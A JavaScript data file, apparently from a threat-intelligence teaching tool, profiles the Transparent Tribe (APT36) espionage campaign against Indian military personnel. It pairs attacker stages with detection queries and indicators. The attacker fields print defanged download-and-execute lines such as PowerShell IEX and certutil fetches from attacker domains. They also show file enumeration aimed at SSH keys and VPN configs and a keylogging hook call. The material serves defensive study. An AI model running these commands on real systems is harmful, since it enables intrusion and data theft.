const transparenttribe = {
  id: "transparenttribe",
  name: "Transparent Tribe",
  aliases: ["APT36", "ProjectM", "Mythic Leopard", "COPPER FIELDSTONE"],
  origin: "Pakistan",
  motivation: "Espionage",
  attribution: "Community Consensus",
  description:
    "Transparent Tribe (APT36) is a Pakistan-linked threat actor assessed to operate on behalf of Pakistani intelligence services. Active since at least 2013, the group primarily targets Indian military personnel, government officials, and diplomatic staff using spearphishing lures and custom remote access tools.",
  campaigns: [
    {
      id: "indian-military-targeting-2022",
      name: "Indian Military Credential Harvesting",
      year: "2022–2023",
      target: "Indian Military & Government Personnel",
      summary:
        "Transparent Tribe conducted a sustained credential harvesting and espionage campaign against Indian Army, Air Force, and Ministry of Defence personnel. Operators distributed military-themed spearphishing documents embedding Crimson RAT and ObliqueRAT to establish persistent access, capture keystrokes, and exfiltrate sensitive defence documents.",
      sources: [
        {
          title: "Transparent Tribe: Evolution of Tactics and Targets",
          publisher: "Cisco Talos",
          url: "https://blog.talosintelligence.com/transparent-tribe-new-campaign-2022/",
        },
        {
          title: "APT36 Targets India with New Crimson RAT Campaign",
          publisher: "Zscaler ThreatLabz",
          url: "https://www.zscaler.com/blogs/security-research/apt36-india-crimson-rat",
        },
        {
          title: "Transparent Tribe — APT36 MITRE ATT&CK Profile",
          publisher: "MITRE ATT&CK",
          url: "https://attack.mitre.org/groups/G0134/",
        },
      ],
      diamondModel: {
        adversary: {
          name: "Transparent Tribe (APT36 / Mythic Leopard)",
          sponsor: "Pakistan — assessed ISI-linked threat actor",
          aliases: ["APT36", "ProjectM", "Mythic Leopard", "COPPER FIELDSTONE"],
          motivation:
            "Strategic espionage targeting Indian defence and government to collect military intelligence, order-of-battle data, and diplomatic communications.",
        },
        capability: {
          malware: ["Crimson RAT", "ObliqueRAT", "CAPRA stealer", "CrimsonRAT Android implant"],
          ttps: [
            "T1566.001 — Phishing: Spearphishing Attachment (military-themed decoys)",
            "T1105 — Ingress Tool Transfer (Crimson RAT staging)",
            "T1056.001 — Input Capture: Keylogging (CAPRA stealer)",
            "T1083 — File and Directory Discovery",
            "T1041 — Exfiltration Over C2 Channel",
          ],
          sophistication:
            "Moderate — custom RAT tooling with consistent operational patterns; limited OPSEC relative to tier-1 actors",
        },
        infrastructure: {
          domains: [
            "crimeainstitute[.]com",
            "defence-update[.]in",
            "mod-india[.]net",
            "armyindia-update[.]com",
          ],
          ips: ["103.255.7[.]34", "45.150.108[.]77", "185.234.218[.]100"],
          hosting: "Bullet-proof hosting in Eastern Europe; dynamic DNS providers; reused IP ranges across campaigns",
        },
        victim: {
          sectors: "Indian Army, Indian Air Force, Ministry of Defence, diplomatic personnel",
          geography: "India (primary); Afghanistan, Nepal (secondary)",
          targeting:
            "Spearphishing focused on serving military officers, defence contractors, and government employees accessing defence networks",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1566.001",
          ttpName: "Phishing: Spearphishing Attachment",
          phase: "Initial Access",
          attacker: {
            summary:
              "Operators sent targeted spearphishing emails to Indian military and government personnel with military-themed Office documents attached. Lures impersonated Indian Army circulars, pay-slip notifications, and MoD policy updates. Malicious macros or embedded OLE objects downloaded and executed Crimson RAT from attacker-controlled staging servers.",
            tools: ["Crimson RAT dropper", "ObliqueRAT", "Macro-enabled DOCX/XLSX lures"],
            commands: [
              "// VBA macro drops and executes Crimson RAT loader",
              "Shell \"cmd /c powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://mod-india[.]net/update.ps1')\"",
              "// Alternate delivery: embedded OLE object executes on document open",
              "wscript.exe //B //NoLogo %TEMP%\\svchost32.vbs",
            ],
          },
          defender: {
            logs: [
              "Email gateway logs — malicious attachment delivery (SMTP/EML headers)",
              "Endpoint process logs — WINWORD.EXE or EXCEL.EXE spawning cmd.exe or wscript.exe (Sysmon Event ID 1)",
              "Network proxy logs — Office process initiating outbound HTTP (suspicious parent-child)",
              "Windows Security Event ID 4688 — suspicious child process of Office application",
            ],
            detection:
              "Alert on Office applications spawning scripting interpreters (cmd, wscript, powershell). Monitor for outbound HTTP connections from Office processes. Flag .docx attachments with embedded macros arriving from external senders to defence-sector recipients.",
            siemQuery:
              'index=sysmon EventCode=1 ParentImage="*\\WINWORD.EXE" Image IN ("*\\cmd.exe","*\\wscript.exe","*\\powershell.exe") | stats count by ComputerName, CommandLine, ParentCommandLine',
            ifMissed:
              "Crimson RAT establishes persistent C2 within hours of initial execution, enabling credential theft and long-term surveillance of defence networks.",
          },
          iocs: [
            {
              type: "Domain",
              indicator: "mod-india[.]net",
              description: "Crimson RAT staging server impersonating Indian Ministry of Defence",
            },
            {
              type: "Domain",
              indicator: "armyindia-update[.]com",
              description: "Spearphishing lure hosting domain mimicking Indian Army update portal",
            },
            {
              type: "File",
              indicator: "Army_Circular_2023.docm",
              description: "Malicious macro-enabled Word document used as spearphishing lure",
            },
            {
              type: "File",
              indicator: "Pay_Revision_Notice.xlsm",
              description: "Macro-enabled Excel lure impersonating Indian Army pay notification",
            },
          ],
        },
        {
          id: "ingress-tool-transfer",
          name: "Ingress Tool Transfer",
          ttp: "T1105",
          ttpName: "Ingress Tool Transfer",
          phase: "Command & Control",
          attacker: {
            summary:
              "Following successful macro execution, Crimson RAT contacted attacker-controlled C2 infrastructure to retrieve secondary payloads. ObliqueRAT and the CAPRA credential stealer were fetched via HTTP GET requests to staging servers disguised as legitimate update endpoints. File writes were directed to %APPDATA% and %TEMP% directories to avoid detection.",
            tools: ["Crimson RAT", "ObliqueRAT", "CAPRA stealer"],
            commands: [
              "// Crimson RAT downloads secondary payload",
              "certutil.exe -urlcache -f http://crimeainstitute[.]com/svchost.exe %APPDATA%\\Microsoft\\svchost32.exe",
              "// Alternate download via PowerShell",
              "(New-Object Net.WebClient).DownloadFile('http://45.150.108[.]77/update.bin','%TEMP%\\update.exe')",
              "// Execute dropped payload with hidden window",
              "Start-Process -WindowStyle Hidden '%TEMP%\\update.exe'",
            ],
          },
          defender: {
            logs: [
              "Network proxy/firewall — HTTP GET to unusual domains from corporate endpoints",
              "Sysmon Event ID 11 — file creation in %APPDATA% or %TEMP% by certutil/PowerShell",
              "Sysmon Event ID 1 — certutil.exe with -urlcache flag (LOLBin abuse)",
              "DNS query logs — newly registered or low-reputation domains queried",
            ],
            detection:
              "Alert on certutil.exe usage with -urlcache or -decode flags. Monitor PowerShell DownloadFile/DownloadString calls. Correlate executable writes to %TEMP% or %APPDATA% with subsequent process creation from those paths.",
            siemQuery:
              'index=sysmon EventCode=1 (Image="*\\certutil.exe" CommandLine="*urlcache*") OR (Image="*\\powershell.exe" CommandLine="*DownloadFile*" OR CommandLine="*DownloadString*") | stats count by ComputerName, CommandLine',
            ifMissed:
              "ObliqueRAT and CAPRA stealer gain a persistent foothold, enabling keylogging and document theft to proceed undetected for months.",
          },
          iocs: [
            {
              type: "Domain",
              indicator: "crimeainstitute[.]com",
              description: "Crimson RAT C2 server used for secondary payload staging",
            },
            {
              type: "IP",
              indicator: "45.150.108[.]77",
              description: "ObliqueRAT staging server IP address",
            },
            {
              type: "Command",
              indicator: "certutil.exe -urlcache -f http://crimeainstitute[.]com/svchost.exe",
              description: "LOLBin certutil download command used by Crimson RAT dropper",
            },
          ],
        },
        {
          id: "keylogging",
          name: "Keylogging",
          ttp: "T1056.001",
          ttpName: "Input Capture: Keylogging",
          phase: "Collection",
          attacker: {
            summary:
              "The CAPRA stealer component installed a Windows keylogger hook via SetWindowsHookEx to capture all keystrokes from targeted users. Captured keystrokes were timestamped and written to an encrypted local log file. The stealer also captured screenshots at configurable intervals to correlate keystrokes with application context, enabling recovery of credentials, document contents, and secure messaging.",
            tools: ["CAPRA stealer", "Crimson RAT keylogger module"],
            commands: [
              "// CAPRA registers low-level keyboard hook",
              "SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0)",
              "// Keylog output written to encrypted file",
              "// Default path: %APPDATA%\\Microsoft\\Network\\klog.dat",
              "// Screenshot capture at 30-second intervals",
              "// Output: %APPDATA%\\Microsoft\\Network\\scr_<timestamp>.bmp",
            ],
          },
          defender: {
            logs: [
              "Sysmon Event ID 10 — process accessing LSASS or other sensitive process memory",
              "Sysmon Event ID 11 — unexpected file creation in %APPDATA%\\Microsoft\\Network\\",
              "Windows API monitoring — SetWindowsHookEx calls from non-standard processes",
              "EDR behavioral alerts — keyboard hook installation by non-UI processes",
            ],
            detection:
              "Monitor for SetWindowsHookEx API calls (WH_KEYBOARD_LL hook type) from processes not expected to monitor input. Alert on recurring encrypted file writes to %APPDATA% subdirectories. EDR tools with API hooking visibility are most effective.",
            siemQuery:
              'index=sysmon EventCode=11 TargetFilename="*\\AppData\\Roaming\\Microsoft\\Network\\*" Image!="*\\Microsoft\\*" | stats count by ComputerName, Image, TargetFilename',
            ifMissed:
              "Attackers collect weeks or months of credentials, VPN passwords, and classified document contents, enabling privilege escalation and lateral movement to higher-value defence systems.",
          },
          iocs: [
            {
              type: "Path",
              indicator: "%APPDATA%\\Microsoft\\Network\\klog.dat",
              description: "CAPRA stealer keylogger output file path",
            },
            {
              type: "Path",
              indicator: "%APPDATA%\\Microsoft\\Network\\scr_*.bmp",
              description: "CAPRA stealer screenshot files (timestamped BMP format)",
            },
            {
              type: "Tool",
              indicator: "CAPRA stealer",
              description: "Transparent Tribe custom credential and keylogging tool",
            },
          ],
        },
        {
          id: "file-discovery",
          name: "File and Directory Discovery",
          ttp: "T1083",
          ttpName: "File and Directory Discovery",
          phase: "Discovery",
          attacker: {
            summary:
              "Crimson RAT's file manager module enumerated victim file systems to identify high-value targets: classified documents, VPN configuration files, SSH keys, and official correspondence. The RAT recursively searched common directories and transmitted directory listings to C2. File types prioritized included .pdf, .docx, .xlsx, .pptx, and files matching military nomenclature patterns.",
            tools: ["Crimson RAT file manager module", "ObliqueRAT"],
            commands: [
              "// Crimson RAT built-in file enumeration (C2-controlled)",
              "// Equivalent shell enumeration of high-value paths",
              "dir /s /b C:\\Users\\%USERNAME%\\Documents\\*.pdf > %TEMP%\\fl.txt",
              "dir /s /b C:\\Users\\%USERNAME%\\Desktop\\*.docx >> %TEMP%\\fl.txt",
              "// Search for VPN and credential files",
              "dir /s /b C:\\Program Files\\Cisco\\*.xml C:\\Users\\%USERNAME%\\.ssh\\* >> %TEMP%\\fl.txt",
              "// PowerShell recursive search",
              "Get-ChildItem -Path C:\\Users -Include *.pdf,*.docx -Recurse -ErrorAction SilentlyContinue | Select FullName | Export-Csv %TEMP%\\flist.csv",
            ],
          },
          defender: {
            logs: [
              "Sysmon Event ID 1 — dir.exe or Get-ChildItem with recursive flags from anomalous parent process",
              "Sysmon Event ID 11 — creation of inventory files (fl.txt, flist.csv) in %TEMP%",
              "File system audit logs — mass read access to document directories (Windows Security Event 4663)",
              "EDR — large-scale file enumeration behavior detection",
            ],
            detection:
              "Alert on processes performing recursive directory enumeration across user document folders. Monitor for bulk file read events (Event ID 4663) on classified or sensitive document directories. Correlate with subsequent network activity indicating exfiltration.",
            siemQuery:
              'index=sysmon EventCode=1 CommandLine="*dir /s*" OR CommandLine="*Get-ChildItem*-Recurse*" Image!="*explorer.exe" | stats count by ComputerName, User, CommandLine | where count > 5',
            ifMissed:
              "Adversary maps the entire document repository, enabling targeted exfiltration of the highest-value classified files while minimising network noise.",
          },
          iocs: [
            {
              type: "Path",
              indicator: "%TEMP%\\fl.txt",
              description: "Crimson RAT file listing output — recursive document enumeration",
            },
            {
              type: "Command",
              indicator: "dir /s /b C:\\Users\\%USERNAME%\\Documents\\*.pdf",
              description: "File discovery command pattern used by Transparent Tribe operators",
            },
          ],
        },
        {
          id: "exfiltration",
          name: "Exfiltration over C2",
          ttp: "T1041",
          ttpName: "Exfiltration Over C2 Channel",
          phase: "Exfiltration",
          attacker: {
            summary:
              "Crimson RAT exfiltrated collected files and keylogger data over its existing HTTP C2 channel using custom binary protocol with XOR obfuscation. Files were chunked into ~512 KB segments and transmitted in POST requests to C2 servers. ObliqueRAT used a separate TCP channel for large document transfers to avoid triggering HTTP anomaly detection. Exfiltrated data included classified military documents, VPN credentials, and CAPRA stealer logs.",
            tools: ["Crimson RAT exfil module", "ObliqueRAT TCP channel"],
            commands: [
              "// Crimson RAT uses HTTP POST with XOR-obfuscated body",
              "// C2 traffic pattern: POST /update.php HTTP/1.1",
              "// Host: defence-update[.]in",
              "// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
              "// ObliqueRAT large-file transfer over raw TCP port 9999",
              "// File chunks: 524288 bytes with 4-byte length prefix header",
            ],
          },
          defender: {
            logs: [
              "Network proxy/firewall — repeated POST requests to same external domain from single host",
              "NetFlow — sustained outbound TCP connections to non-standard ports (9999)",
              "DNS logs — repeated resolution of C2 domains (defence-update[.]in, crimeainstitute[.]com)",
              "DLP — large document transfers leaving network boundary",
            ],
            detection:
              "Monitor for hosts making repeated HTTP POST requests to low-reputation domains. Alert on outbound TCP connections to port 9999 or other non-standard ports. Correlate DNS queries to newly registered domains with subsequent data transfer volume anomalies.",
            siemQuery:
              'index=network sourcetype=proxy method=POST dest_port=80 | stats sum(bytes_out) as total_out count as requests by src_ip, dest_host | where total_out > 5000000 OR requests > 50 | sort -total_out',
            ifMissed:
              "Months of classified military intelligence, personnel credentials, and operational planning documents are delivered to Pakistani intelligence services, causing severe national security damage.",
          },
          iocs: [
            {
              type: "Domain",
              indicator: "defence-update[.]in",
              description: "Crimson RAT C2 exfiltration endpoint impersonating Indian defence portal",
            },
            {
              type: "IP",
              indicator: "185.234.218[.]100",
              description: "ObliqueRAT TCP C2 server used for large file exfiltration",
            },
            {
              type: "IP",
              indicator: "103.255.7[.]34",
              description: "Transparent Tribe C2 infrastructure IP — active 2022-2023",
            },
            {
              type: "URL Pattern",
              indicator: "POST /update.php HTTP/1.1 to *.in domains from military endpoints",
              description: "Crimson RAT exfiltration HTTP traffic pattern",
            },
          ],
        },
      ],
    },
  ],
}

export default transparenttribe
